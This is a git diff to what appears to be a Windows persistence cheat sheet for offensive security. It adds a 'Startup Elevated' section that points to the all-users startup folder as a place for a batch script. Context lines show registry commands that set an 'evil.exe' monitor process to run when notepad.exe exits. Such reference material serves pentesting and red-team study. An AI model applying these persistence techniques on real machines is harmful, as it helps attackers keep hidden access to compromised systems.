@@ -18,6 +18,7 @@
     * [Registry HKLM](#registry-hklm)
         * [Winlogon Helper DLL](#)
         * [GlobalFlag](#)
+    * [Startup Elevated](#startup-elevated)
     * [Services Elevated](#services-elevated)
     * [Scheduled Tasks Elevated](#scheduled-tasks-elevated)
     * [Binary Replacement](#binary-replacement)
@@ -235,6 +236,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
 
+### Startup Elevated
+
+Create a batch script in the user startup folder.
+
+```powershell
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
+```
 
 ### Services Elevated
 
